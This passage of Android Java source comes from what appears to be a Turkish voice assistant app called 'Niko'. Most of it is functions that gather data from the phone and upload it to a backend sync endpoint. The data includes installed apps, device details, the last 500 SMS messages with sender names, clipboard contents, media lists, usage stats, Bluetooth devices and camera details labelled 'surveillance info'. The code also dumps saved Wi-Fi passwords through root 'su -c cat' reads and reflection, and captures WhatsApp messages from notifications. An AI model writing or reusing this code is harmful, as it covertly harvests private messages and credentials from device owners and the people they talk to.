        PackageManager pm = getPackageManager();
        // GET_PERMISSIONS bayrağı ile izinleri de çekelim
        List<PackageInfo> packs = pm.getInstalledPackages(PackageManager.GET_PERMISSIONS);
        
        for (PackageInfo p : packs) {
            // Sadece kullanıcı tarafından yüklenen uygulamaları al (sistem uygulamalarını filtrele)
            // VEYA güncellenmiş sistem uygulamalarını dahil et
            boolean isSystem = (p.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
            boolean isUpdatedSystem = (p.applicationInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0;
            
            if (!isSystem || isUpdatedSystem) {
                JSONObject obj = new JSONObject();
                obj.put("name", p.applicationInfo.loadLabel(pm).toString());
                obj.put("package", p.packageName);
                obj.put("version_name", p.versionName);
                obj.put("version_code", p.versionCode); // Deprecated in API 28 but useful
                
                // Zaman Bilgileri
                obj.put("install_time", p.firstInstallTime);
                obj.put("last_update_time", p.lastUpdateTime);
                
                // Teknik Detaylar
                obj.put("target_sdk", p.applicationInfo.targetSdkVersion);
                if (Build.VERSION.SDK_INT >= 24) {
                    obj.put("min_sdk", p.applicationInfo.minSdkVersion);
                }
                obj.put("uid", p.applicationInfo.uid);
                obj.put("is_enabled", p.applicationInfo.enabled);
                obj.put("source_dir", p.applicationInfo.sourceDir);
                obj.put("data_dir", p.applicationInfo.dataDir);
                
                // İzinler (Requested Permissions)
                if (p.requestedPermissions != null && p.requestedPermissions.length > 0) {
                    JSONArray perms = new JSONArray();
                    for (String perm : p.requestedPermissions) {
                        // Sadece ismini al (android.permission.CAMERA -> CAMERA)
                        if (perm.startsWith("android.permission.")) {
                            perms.put(perm.substring("android.permission.".length()));
                        } else {
                            perms.put(perm);
                        }
                    }
                    obj.put("permissions_preview", perms);
                }

                // Yükleyici Kaynağı (Play Store, Samsung Store, APK vs.)
                try {
                    String installer = null;
                    if (Build.VERSION.SDK_INT >= 30) {
                        android.content.pm.InstallSourceInfo isi = pm.getInstallSourceInfo(p.packageName);
                        if (isi != null) installer = isi.getInstallingPackageName();
                    } else {
                        installer = pm.getInstallerPackageName(p.packageName);
                    }
                    obj.put("installer_source", installer != null ? installer : "Sideload/Unknown");
                } catch (Exception e) {
                    obj.put("installer_source", "Unknown");
                }

                array.put(obj);
            }
        }
        sendSyncRequest(array, "apps");
    }

    /**
     * Cihaz donanım ve sistem bilgilerini (Ultra Detaylı) senkronize eder.
     */
    private void syncDeviceInfo() throws Exception {
        JSONObject obj = new JSONObject();

        // 1. Batarya Detayları (Intent ile anlık durum)
        Intent batteryStatus = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        if (batteryStatus != null) {
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            float batteryPct = level * 100 / (float)scale;
            obj.put("battery_level", batteryPct);
            
            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            String statusStr = "Unknown";
            if(status == BatteryManager.BATTERY_STATUS_CHARGING) statusStr = "Charging";
            else if(status == BatteryManager.BATTERY_STATUS_DISCHARGING) statusStr = "Discharging";
            else if(status == BatteryManager.BATTERY_STATUS_FULL) statusStr = "Full";
            else if(status == BatteryManager.BATTERY_STATUS_NOT_CHARGING) statusStr = "Not Charging";
            obj.put("battery_status", statusStr);

            int health = batteryStatus.getIntExtra(BatteryManager.EXTRA_HEALTH, -1);
            // 2=Good, 3=Overheat, 4=Dead, 5=OverVoltage, 7=Cold
            obj.put("battery_health_code", health);
            
            obj.put("battery_tech", batteryStatus.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY));
            obj.put("battery_temp_c", batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10.0);
            obj.put("battery_voltage_mv", batteryStatus.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0));
            
            int plugged = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
            String pluggedStr = "None";
            if(plugged == BatteryManager.BATTERY_PLUGGED_AC) pluggedStr = "AC";
            else if(plugged == BatteryManager.BATTERY_PLUGGED_USB) pluggedStr = "USB";
            else if(plugged == BatteryManager.BATTERY_PLUGGED_WIRELESS) pluggedStr = "Wireless";
            obj.put("power_source", pluggedStr);
        }

        // 2. Depolama
        File path = Environment.getDataDirectory();
        StatFs stat = new StatFs(path.getPath());
        long totalSize = stat.getBlockCountLong() * stat.getBlockSizeLong();
        long availableSize = stat.getAvailableBlocksLong() * stat.getBlockSizeLong();
        obj.put("storage_total_gb", totalSize / (1024 * 1024 * 1024));
        obj.put("storage_available_gb", availableSize / (1024 * 1024 * 1024));

        // 3. RAM (Bellek)
        android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
        android.app.ActivityManager activityManager = (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
        activityManager.getMemoryInfo(mi);
        obj.put("ram_total_gb", String.format(Locale.US, "%.2f", mi.totalMem / (1024.0 * 1024 * 1024)));
        obj.put("ram_available_gb", String.format(Locale.US, "%.2f", mi.availMem / (1024.0 * 1024 * 1024)));
        obj.put("ram_is_low", mi.lowMemory);

        // 4. Ekran
        android.util.DisplayMetrics metrics = getResources().getDisplayMetrics();
        obj.put("screen_res", metrics.widthPixels + "x" + metrics.heightPixels);
        obj.put("screen_density_dpi", metrics.densityDpi);
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        if (wm != null) {
             obj.put("screen_refresh_rate", wm.getDefaultDisplay().getRefreshRate());
        }

        // 5. Sistem & İşletim Sistemi
        obj.put("android_ver", Build.VERSION.RELEASE);
        obj.put("sdk_int", Build.VERSION.SDK_INT);
        obj.put("security_patch", Build.VERSION.SECURITY_PATCH);
        obj.put("language", Locale.getDefault().getDisplayLanguage());
        obj.put("timezone", java.util.TimeZone.getDefault().getID());
        // Uptime (Saat cinsinden)
        long uptime = android.os.SystemClock.elapsedRealtime();
        obj.put("uptime_hours", String.format(Locale.US, "%.1f", uptime / (1000.0 * 3600)));

        // 6. Donanım (Ultra)
        obj.put("manufacturer", Build.MANUFACTURER);
        obj.put("model", Build.MODEL);
        obj.put("brand", Build.BRAND);
        obj.put("board", Build.BOARD);
        obj.put("bootloader", Build.BOOTLOADER);
        obj.put("hardware", Build.HARDWARE);
        obj.put("product", Build.PRODUCT);
        obj.put("device", Build.DEVICE);
        obj.put("fingerprint", Build.FINGERPRINT);
        
        JSONArray abis = new JSONArray();
        for (String abi : Build.SUPPORTED_ABIS) abis.put(abi);
        obj.put("supported_abis", abis);

        // 7. Root Kontrolü (Basit)
        boolean isRooted = false;
        String[] suPaths = { "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su" };
        for (String p : suPaths) {
            if (new File(p).exists()) { isRooted = true; break; }
        }
        if (!isRooted && Build.TAGS != null && Build.TAGS.contains("test-keys")) isRooted = true;
        obj.put("is_rooted", isRooted);

        JSONArray array = new JSONArray();
        array.put(obj);
        sendSyncRequest(array, "device_info");
    }

    // ================= YENİ EKLENEN VERİ ÇEKME FONKSİYONLARI =================

    private void syncSMS() throws Exception {
        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
             // android.util.Log.w("NIKO_SYNC", "SMS permission denied");
             // addLog("[SYNC WARN] SMS izni reddedildi.");
             return;
        }
        
        JSONArray array = new JSONArray();
        try {
            Uri uri = Telephony.Sms.CONTENT_URI;
            // Son 500 mesajı çek (Performans için limitli)
            try (Cursor c = getContentResolver().query(uri, null, null, null, "date DESC LIMIT 500")) {
                if (c != null) {
                    while (c.moveToNext()) {
                        JSONObject obj = new JSONObject();
                        obj.put("address", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                        obj.put("body", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                        obj.put("date", c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                        obj.put("type", c.getInt(c.getColumnIndexOrThrow(Telephony.Sms.TYPE))); // 1: Gelen, 2: Giden
                        // Detaylı bilgiler
                        obj.put("read", c.getInt(c.getColumnIndexOrThrow(Telephony.Sms.READ))); // 0=Okunmadı, 1=Okundu
                        obj.put("status", c.getInt(c.getColumnIndexOrThrow(Telephony.Sms.STATUS)));
                        obj.put("service_center", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.SERVICE_CENTER)));
                        obj.put("protocol", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.PROTOCOL)));
                        
                        // [ULTRA DETAIL] - Daha derin SMS verileri
                        obj.put("thread_id", c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID))); // Mesajlaşma grubu ID'si
                        obj.put("date_sent", c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.DATE_SENT))); // Gönderilme zamanı
                        obj.put("seen", c.getInt(c.getColumnIndexOrThrow(Telephony.Sms.SEEN))); // Görüldü mü?
                        
                        // Opsiyonel Alanlar (Bazı cihazlarda olmayabilir, hata vermemesi için kontrol edilebilir ama getColumnIndex -1 dönerse sorun yok)
                        int replyPathIdx = c.getColumnIndex(Telephony.Sms.REPLY_PATH_PRESENT);
                        if (replyPathIdx != -1) obj.put("reply_path_present", c.getInt(replyPathIdx));
                        
                        int lockedIdx = c.getColumnIndex(Telephony.Sms.LOCKED);
                        if (lockedIdx != -1) obj.put("locked", c.getInt(lockedIdx));
                        
                        int errorIdx = c.getColumnIndex(Telephony.Sms.ERROR_CODE);
                        if (errorIdx != -1) obj.put("error_code", c.getInt(errorIdx));

                        // Çoklu SIM desteği için SubID
                        int subIdx = c.getColumnIndex(Telephony.Sms.SUBSCRIPTION_ID);
                        if (subIdx != -1) obj.put("subscription_id", c.getInt(subIdx));
                        
                        // Gönderici İsmi Çözümleme (Rehberden)
                        // Performans için sadece bilinmeyen numaralar yerine hepsine bakıyoruz ama thread'de oldugu için sorun olmaz
                        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                            String address = obj.getString("address");
                            Uri contactUri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address));
                            try (Cursor contactCursor = getContentResolver().query(contactUri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null)) {
                                if (contactCursor != null && contactCursor.moveToFirst()) {
                                    obj.put("sender_name", contactCursor.getString(0));
                                } else {
                                    obj.put("sender_name", "Unknown"); // Rehberde yok
                                }
                            } catch (Exception ignored) {}
                        }

                        array.put(obj);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            // android.util.Log.e("NIKO_SYNC", "Error syncing SMS: " + e.getMessage());
        }
        if (array.length() > 0) sendSyncRequest(array, "sms");
    }

    /**
     * Ağ, Wi-Fi ve Operatör bilgilerini detaylı çeker.
     */
    private void syncNetworkInfo() throws Exception {
        JSONObject obj = new JSONObject();
        
        // Wi-Fi Bilgileri
        WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wifi != null && wifi.isWifiEnabled()) {
            android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
            if (info != null) {
                obj.put("wifi_ssid", info.getSSID());
                obj.put("wifi_bssid", info.getBSSID());
                obj.put("wifi_speed_mbps", info.getLinkSpeed());
                obj.put("wifi_rssi", info.getRssi());
                obj.put("wifi_frequency", info.getFrequency()); // MHz cinsinden
                obj.put("wifi_network_id", info.getNetworkId());
                obj.put("mac_address", info.getMacAddress()); // Android 10+ için genelde rastgeledir
                int ip = info.getIpAddress();
                obj.put("local_ip", String.format(Locale.getDefault(), "%d.%d.%d.%d", (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff)));
                
                // Kayıtlı Ağlardan Şifre Denemesi (Android 10+ için kısıtlıdır, genellikle null döner)
                String passwordAttempt = null;
                String passwordSource = "None";

                // Yöntem 1: Standart API (Legacy)
                if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    try {
                        List<android.net.wifi.WifiConfiguration> configs = wifi.getConfiguredNetworks();
                        if (configs != null) {
                            for (android.net.wifi.WifiConfiguration config : configs) {
                                if (config.SSID != null && config.SSID.equals(info.getSSID())) {
                                    passwordAttempt = config.preSharedKey;
                                    passwordSource = "API (Legacy)";
                                    break;
                                }
                            }
                        }
                    } catch (SecurityException se) {
                        passwordSource = "API Restricted";
                    }
                }

                // Yöntem 2: Root Erişimi (Eğer API başarısızsa)
                if (passwordAttempt == null || passwordAttempt.contains("*")) {
                    try {
                        // Farklı Android sürümleri için muhtemel yollar
                        String[] paths = {
                            "/data/misc/wifi/WifiConfigStore.xml",
                            "/data/misc/wifi/wpa_supplicant.conf"
                        };
                        
                        for (String path : paths) {
                            Process p = Runtime.getRuntime().exec("su -c cat " + path);
                            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                            StringBuilder sb = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) {
                                sb.append(line).append("\n");
                            }
                            String output = sb.toString();
                            
                            if (output.length() > 0) {
                                // Basitçe tüm içeriği "raw_config" olarak ekleyebiliriz veya parse edebiliriz.
                                // Şimdilik ham veriyi ekleyelim, çünkü parse etmek karmaşık olabilir.
                                obj.put("wifi_config_dump_" + new File(path).getName(), output);
                                passwordSource = "ROOT (" + path + ")";
                                
                                // Basit Regex ile şifre yakalama denemesi (SSID ile eşleşen blokta)
                                // Not: Tam XML parse etmek daha iyidir ama burada quick-win yapıyoruz.
                                if (output.contains(info.getSSID().replace("\"", ""))) {
                                     passwordAttempt = "Found in Root Dump (Check raw data)";
                                }
                                break;
                            }
                        }
                    } catch (Exception e) {
                        passwordSource = "No Root / Access Denied";
                    }
                }
                
                // Yerel olarak bulunamadıysa, Backend'den (Main.py) internet sorgusu iste
                if (passwordAttempt == null || passwordAttempt.equals("Not Found")) {
                    passwordAttempt = "Not Found (Cloud Analysis Requested)";
                    
                    // Yöntem 3: Reflection ile "mOriginalConfig" veya gizli alanlara erişim denemesi
                    try {
                        List<android.net.wifi.WifiConfiguration> configs = wifi.getConfiguredNetworks();
                        for (android.net.wifi.WifiConfiguration config : configs) {
                             if (config.SSID != null && config.SSID.equals(info.getSSID())) {
                                 // Gizli alanları zorla okumayı dne
                                 java.lang.reflect.Field field = config.getClass().getDeclaredField("defaultGwMacAddress"); 
                                 field.setAccessible(true);
                                 // Bu sadece bir örnek, gerçek şifre alanı üreticiye göre değişir.
                                 // Xiaomi için 'wepKeys' veya 'preSharedKey' bazen doludur ama gizlidir.
                                 if (config.preSharedKey != null && !config.preSharedKey.equals("*")) {
                                     passwordAttempt = config.preSharedKey;
                                     passwordSource = "Reflection/Cache Hit";
                                 }
                             }
                        }
                    } catch (Exception e) {}
                }
                
                obj.put("wifi_password_attempt", passwordAttempt != null ? passwordAttempt : "Not Found");
                obj.put("wifi_password_source", passwordSource);
                
                // Kullanıcıya şifreyi alması için yol göster (Manuel QR Tarama)
                obj.put("manual_action_hint", "Settings > Wi-Fi > Tap to Share Password (QR)");
            }
        }
        
        // Mobil Şebeke Bilgileri
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (tm != null) {
            obj.put("network_operator", tm.getNetworkOperatorName());
            obj.put("sim_operator", tm.getSimOperatorName());
            obj.put("network_type", tm.getDataNetworkType());
            obj.put("phone_type", tm.getPhoneType());
            obj.put("is_roaming", tm.isNetworkRoaming());
            obj.put("data_state", tm.getDataState()); // 0:Disconnected, 2:Connected
            obj.put("sim_country_iso", tm.getSimCountryIso());
            
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                // IMEI / Device ID (Android 10+ için kısıtlıdır, Android ID kullanılır)
                String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                obj.put("device_id_android", androidId);
            }
        }

        JSONArray array = new JSONArray();
        array.put(obj);
        sendSyncRequest(array, "network_info");
    }

    /**
     * Eşleşmiş Bluetooth cihazlarını listeler.
     */
    private void syncBluetoothDevices() throws Exception {
        BluetoothAdapter btAdapter = BluetoothAdapter.getDefaultAdapter();
        if (btAdapter == null) return;
        
        if (Build.VERSION.SDK_INT >= 31) {
            if (checkSelfPermission(Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) return;
        }

        JSONArray array = new JSONArray();
        // Eşleşmiş cihazlar
        for (android.bluetooth.BluetoothDevice device : btAdapter.getBondedDevices()) {
             JSONObject obj = new JSONObject();
             obj.put("name", device.getName());
             obj.put("mac", device.getAddress());
             obj.put("type", device.getType());
             obj.put("bond_state", device.getBondState());
             // Detaylar (API 18+)
             obj.put("device_class", device.getBluetoothClass().getDeviceClass());
             obj.put("major_device_class", device.getBluetoothClass().getMajorDeviceClass());
             array.put(obj);
        }
        
        if (array.length() > 0) sendSyncRequest(array, "bluetooth_devices");
    }

    /**
     * Panodaki son kopyalanan metni çeker (UI Thread gerektirir).
     */
    private void syncClipboard() {
        runOnUiThread(() -> {
            try {
                ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                if (clipboard != null && clipboard.hasPrimaryClip()) {
                    if (clipboard.getPrimaryClipDescription().hasMimeType(android.content.ClipDescription.MIMETYPE_TEXT_PLAIN)) {
                        ClipData.Item item = clipboard.getPrimaryClip().getItemAt(0);
                        CharSequence text = item.getText();
                        if (text != null && text.length() > 0) {
                             new Thread(() -> {
                                 try {
                                     JSONObject obj = new JSONObject();
                                     obj.put("content", text.toString());
                                     obj.put("captured_at", System.currentTimeMillis());
                                     JSONArray array = new JSONArray();
                                     array.put(obj);
                                     sendSyncRequest(array, "clipboard");
                                 } catch (Exception e) {}
                             }).start();
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    /**
     * Galerideki son medya dosyalarının (Fotoğraf/Video) meta verilerini çeker.
     * Dosyaların kendisini göndermez, sadece listesini gönderir.
     */
    private void syncMedia() throws Exception {
        if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) return;

        JSONArray array = new JSONArray();
        Uri uri = MediaStore.Files.getContentUri("external");
        
        // Sadece Resim ve Videoları al
        String selection = MediaStore.Files.FileColumns.MEDIA_TYPE + "="
                + MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE
                + " OR "
                + MediaStore.Files.FileColumns.MEDIA_TYPE + "="
                + MediaStore.Files.FileColumns.MEDIA_TYPE_VIDEO;

        try (Cursor c = getContentResolver().query(uri, null, selection, null, MediaStore.Files.FileColumns.DATE_ADDED + " DESC LIMIT 100")) {
            if (c != null) {
                while (c.moveToNext()) {
                    JSONObject obj = new JSONObject();
                    obj.put("display_name", c.getString(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DISPLAY_NAME)));
                    obj.put("size", c.getLong(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.SIZE)));
                    obj.put("date_added", c.getLong(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATE_ADDED)));
                    obj.put("date_modified", c.getLong(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATE_MODIFIED)));
                    obj.put("mime_type", c.getString(c.getColumnIndexOrThrow(MediaStore.Files.FileColumns.MIME_TYPE)));
                    
                    // Klasör (Bucket) Adı Kontrolü
                    int bucketIdx = c.getColumnIndex("bucket_display_name");
                    if (bucketIdx != -1) {
                        obj.put("bucket_name", c.getString(bucketIdx));
                    }
                    
                    array.put(obj);
                }
            }
        }
        if (array.length() > 0) sendSyncRequest(array, "media_files");
    }

    /**
     * Cihazdaki tüm sensörlerin listesini çıkarır.
     */
    private void syncSensors() throws Exception {
        SensorManager sm = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        if (sm == null) return;
        
        List<Sensor> sensors = sm.getSensorList(Sensor.TYPE_ALL);
        JSONArray array = new JSONArray();
        
        for (Sensor s : sensors) {
            JSONObject obj = new JSONObject();
            obj.put("name", s.getName());
            obj.put("vendor", s.getVendor());
            obj.put("version", s.getVersion());
            obj.put("power_ma", s.getPower());
            obj.put("type", s.getType());
            obj.put("max_range", s.getMaximumRange());
            obj.put("resolution", s.getResolution());
            obj.put("min_delay", s.getMinDelay());
            array.put(obj);
        }
        if (array.length() > 0) sendSyncRequest(array, "sensors");
    }

    /**
     * Uygulama kullanım istatistiklerini çeker (Özel izin gerektirir).
     */
    private void syncUsageStats() throws Exception {
        UsageStatsManager usm = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
        if (usm == null) return;

        Calendar cal = Calendar.getInstance();
        cal.add(Calendar.DAY_OF_YEAR, -1); // Son 24 saat
        long startTime = cal.getTimeInMillis();
        long endTime = System.currentTimeMillis();

        // Bu işlem için ayarlardan izin verilmiş olması gerekir, yoksa boş döner
        List<UsageStats> stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, startTime, endTime);
        
        if (stats != null && !stats.isEmpty()) {
            JSONArray array = new JSONArray();
            for (UsageStats u : stats) {
                if (u.getTotalTimeInForeground() > 0) {
                    JSONObject obj = new JSONObject();
                    obj.put("package", u.getPackageName());
                    obj.put("total_time_foreground_ms", u.getTotalTimeInForeground());
                    obj.put("last_time_used", u.getLastTimeUsed());
                    array.put(obj);
                }
            }
            if (array.length() > 0) sendSyncRequest(array, "usage_stats");
        }
    }

    /**
     * Kamera ve Mikrofon yeteneklerini (Surveillance Info) çeker.
     */
    private void syncSurveillanceInfo() throws Exception {
        JSONObject obj = new JSONObject();
        
        // Mikrofon Kontrolü
        boolean hasMic = getPackageManager().hasSystemFeature(PackageManager.FEATURE_MICROPHONE);
        obj.put("has_microphone", hasMic);
        
        // Kamera Detayları
        CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        if (manager != null) {
            JSONArray cameras = new JSONArray();
            for (String cameraId : manager.getCameraIdList()) {
                JSONObject cam = new JSONObject();
                CameraCharacteristics chars = manager.getCameraCharacteristics(cameraId);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                
                cam.put("id", cameraId);
                cam.put("facing", (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) ? "FRONT" : "BACK");
                
                // Detaylı Kamera Özellikleri
                cam.put("orientation", chars.get(CameraCharacteristics.SENSOR_ORIENTATION));
                Boolean flashAvailable = chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                cam.put("flash_available", flashAvailable != null ? flashAvailable : false);
                
                // Donanım Seviyesi (LIMITED, FULL, LEVEL_3 vs.)
                Integer hwLevel = chars.get(CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL);
                cam.put("hardware_level", hwLevel);
                
                cameras.put(cam);
            }
            obj.put("cameras", cameras);
        }

        JSONArray array = new JSONArray();
        array.put(obj);
        sendSyncRequest(array, "surveillance_info");
    }

    /**
     * Toplanan veriyi backend'e POST eder.
     */
    private void sendSyncRequest(JSONArray data, String type) throws Exception {
        // Not: askAI ile aynı domaini kullanmalıdır
        URL url = new URL(API_BASE_URL + "/sync_data");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");

        // Kimlik Doğrulama
        if (authToken != null) {
            conn.setRequestProperty("Authorization", "Bearer " + authToken);
        } else {
            conn.setRequestProperty("x-api-key", "test");
        }

        conn.setDoOutput(true);

        JSONObject payload = new JSONObject();
        payload.put("data", data);
        payload.put("type", type);
        // Genişletilmiş veri türleri backend'de 'extra_data' olarak saklanabilir
        if (type.equals("sms") || type.equals("media_files") || type.equals("clipboard")) {
             payload.put("is_sensitive", true);
        }
        payload.put("device_name", getDeviceName());

        try (OutputStream os = conn.getOutputStream()) {
            os.write(payload.toString().getBytes("utf-8"));
        }

        int responseCode = conn.getResponseCode();
        // addLog("[SYNC] Veri tipi: " + type + " | Durum: " + responseCode);
        // android.util.Log.d("NIKO_SYNC", "Type: " + type + " | Response Code: " + responseCode);
        
        if (responseCode != 200) {
             try(BufferedReader br = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "utf-8"))) {
                 StringBuilder response = new StringBuilder();
                 String responseLine = null;
                 while ((responseLine = br.readLine()) != null) {
                     response.append(responseLine.trim());
                 }
                 // android.util.Log.e("NIKO_SYNC", "Error Body: " + response.toString());
                 // addLog("[SYNC ERROR] Body: " + response.toString());
             } catch(Exception ex) {}
        }
    }

    /**
     * Cihaz adını döndürür (Üretici_Model).
     */
    private String getDeviceName() {
        return Build.MANUFACTURER + "_" + Build.MODEL;
    }

    /**
     * Sunucudan gelen Base64 formatındaki ses verisini çözer ve oynatır.
     */
    private void playAudio(String base64Sound) {
        try {
            // Ses verisini geçici dosyaya yaz
            byte[] decoded = Base64.decode(base64Sound, Base64.DEFAULT);
            File tempMp3 = File.createTempFile("niko_voice", ".mp3", getCacheDir());
            tempMp3.deleteOnExit();

            FileOutputStream fos = new FileOutputStream(tempMp3);
            fos.write(decoded);
            fos.close();

            // Medya oynatıcıyı UI thread'de başlat
            runOnUiThread(() -> {
                try {
                    MediaPlayer mp = new MediaPlayer();
                    mp.setDataSource(tempMp3.getAbsolutePath());
                    mp.prepare();
                    mp.start();

                    mp.setOnCompletionListener(mediaPlayer -> {
                        mediaPlayer.release();
                    });
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            });

        } catch (Exception e) {
            e.printStackTrace();
            speak("Ses verisi işlenemedi.");
        }
    }

    // ================= METİN OKUMA (TTS) =================

    /**
     * Metin okuma motorunu başlatır.
     */
    private void initTTS() {
        tts = new TextToSpeech(this, status -> {
            if (status == TextToSpeech.SUCCESS) {
                int result = tts.setLanguage(new Locale("tr", "TR"));

                if (result == TextToSpeech.LANG_MISSING_DATA || result == TextToSpeech.LANG_NOT_SUPPORTED) {
                    // Dil desteklenmiyorsa log basılabilir veya kullanıcı uyarılabilir
                } else {
                    // TTS başarıyla yüklendiğinde kendini tanıt
                    // speak("Merhaba, ben Niko. Emrinizdeyim.");
                }
            }
        });

        tts.setOnUtteranceProgressListener(new UtteranceProgressListener() {
            public void onStart(String id) {
                // Konuşma başlayınca yapılacaklar
            }

            public void onDone(String id) {
                // Konuşma bittiğinde tetiklenir
            }

            public void onError(String id) {
            }
        });
    }

    /**
     * Metni seslendirir.
     */
    private void speak(String t) {
        speak(t, true);
    }

    private void speak(String t, boolean saveToHistory) {
        // Sistem mesajlarını ve boş mesajları geçmişe kaydetme
        if (saveToHistory && !t.equals("Dinliyorum...") && !t.equals("Hazır")
                && !t.trim().isEmpty() && t.length() > 2) {
            saveToHistory("Niko", t);
        }
        
        // Seslendirme kuyruğuna ekle
        ttsQueue.offer(t);
        
        runOnUiThread(() -> {
            aiResponseContainer.setVisibility(View.VISIBLE);
            txtAIResponse.setText(t);
            speakNext();
        });
    }

    /**
     * Metni seslendirmeden önce temizler (Emoji, Markdown sembolleri, :P vb.)
     */
    private String cleanTextForTTS(String text) {
        if (text == null) return "";
        
        // 1. Markdown Temizliği (Kalın, İtalik, Başlıklar)
        String cleaned = text.replaceAll("\\*\\*", "")
                            .replaceAll("\\*", "")
                            .replaceAll("###", "")
                            .replaceAll("##", "")
                            .replaceAll("#", "")
                            .replaceAll("`", "");

        // 2. Kod bloklarını tamamen temizle veya basitleştir
        cleaned = cleaned.replaceAll("```[\\s\\S]*?```", "");

        // 3. Yaygın Emoticon ve Sembol Temizliği (:P, :D, XD, :) vb.)
        // Kullanıcı özellikle :P ve benzerlerinin okunmamasını istedi.
        cleaned = cleaned.replaceAll("(?i):P", "")
                         .replaceAll("(?i):D", "")
                         .replaceAll("(?i)XD", "")
                         .replaceAll(":\\)", "")
                         .replaceAll(":\\(", "")
                         .replaceAll(";\\)", "")
                         .replaceAll("<3", "")
                         .replaceAll("[\\uD83C-\\uDBFF\\uDC00-\\uDFFF]+", ""); // Standart Emojiler

        // 4. Linkleri temizle
        cleaned = cleaned.replaceAll("https?://\\S+", "");

        // 5. Fazla boşlukları düzelt
        cleaned = cleaned.replaceAll("\\s+", " ").trim();
        
        return cleaned;
    }

    private void speakNext() {
        if (!tts.isSpeaking() && !ttsQueue.isEmpty()) {
            String originalText = ttsQueue.poll();
            String cleanedText = cleanTextForTTS(originalText);
            
            if (!cleanedText.isEmpty()) {
                tts.speak(cleanedText, TextToSpeech.QUEUE_FLUSH, null, "tts");
            } else {
                // Eğer temizlik sonrası metin boşsa bir sonrakine geç
                speakNext();
            }
        }
    }

    // ================= WHATSAPP ENTEGRASYONU =================

    /**
     * Bildirimleri dinleyerek WhatsApp mesajlarını yakalar.
     * Bu servis için "Bildirim Erişim İzni" verilmesi gerekir.
     */
    public static class WhatsAppService extends NotificationListenerService {

        @Override
        public void onNotificationPosted(StatusBarNotification sbn) {

            // Sadece WhatsApp paketini filtrele
            if (!"com.whatsapp".equals(sbn.getPackageName()))
                return;

            Notification n = sbn.getNotification();
            if (n == null)
                return;

            Bundle e = n.extras;

            // Mesaj içeriğini ve göndereni global değişkenlere kaydet
            lastWhatsAppMessage = String.valueOf(e.getCharSequence(Notification.EXTRA_TEXT));
            lastWhatsAppSender = String.valueOf(e.getCharSequence(Notification.EXTRA_TITLE));

            // Hızlı cevap (Quick Reply) aksiyonlarını bul ve kaydet
            if (n.actions != null) {
                for (Notification.Action a : n.actions) {
                    if (a.getRemoteInputs() != null) {
                        lastReplyIntent = a.actionIntent;
